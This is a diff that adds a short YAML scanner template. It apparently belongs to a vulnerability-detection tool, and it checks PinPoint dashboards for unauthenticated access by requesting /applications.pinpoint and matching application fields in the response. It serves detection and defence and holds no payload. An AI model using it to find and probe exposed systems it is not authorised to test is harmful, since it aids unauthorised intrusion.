@@ -1,0 +1,17 @@
+id: poc-yaml-pinpoint-dashboards-unauth-access
+info:
+  name: PinPoint Dashboards 未授权访问漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: PinPoint
+  osprey-id: vb_2022_0060
+requests:
+- method: GET
+  path: /applications.pinpoint
+  expression: 'status_code == 200 && contains(body, "\"applicationName\":\"") && contains(body,
+    "\"serviceType\":\"")
+
+    '
+variables: {}
+transport: http
